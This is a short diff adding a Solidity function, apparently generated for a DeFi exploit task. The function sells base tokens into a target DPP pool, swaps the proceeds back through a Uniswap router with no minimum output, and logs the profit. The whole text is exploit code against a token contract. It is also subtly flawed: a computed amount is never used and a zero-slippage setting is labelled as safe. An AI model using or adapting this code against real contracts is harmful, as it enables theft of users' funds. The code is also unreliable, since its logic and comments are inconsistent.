@@ -1,0 +1,33 @@
+```plaintext
+<executeExploitCode>
+function executeExploit(uint256) internal {
+    // First, we're going to sell base tokens to generate some profit in quote tokens
+    // We'll use the sellBase function from our target contract
+    uint256 amountToSell = valuableToken.balanceOf(address(this));
+    
+    // Call the sellBase method of the DPP contract
+    IDPP(target).sellBase(address(this));
+    
+    // After the sale, check if we have quote tokens for the next step
+    uint256 quoteBalance = IERC20(token1).balanceOf(address(this));
+    
+    // Now we'll swap the generated quote token for more base token using Uniswap
+    // We will use the swapExactTokensForTokensSupportingFeeOnTransferTokens 
+    address[] memory path = new address[](2);
+    path[0] = address(token1); // The token we received from selling
+    path[1] = address(valuableToken); // The token we want to obtain
+    
+    // Invoke the swap 
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        quoteBalance,
+        0, // We can set the output minimum for safety
+        path,
+        address(this),
+        block.timestamp
+    );
+    
+    // Now we check our valuable tokens balance again
+    console.log("Final valuable balance after exploit: ", valuableToken.balanceOf(address(this)));
+}
+</executeExploitCode>
+```
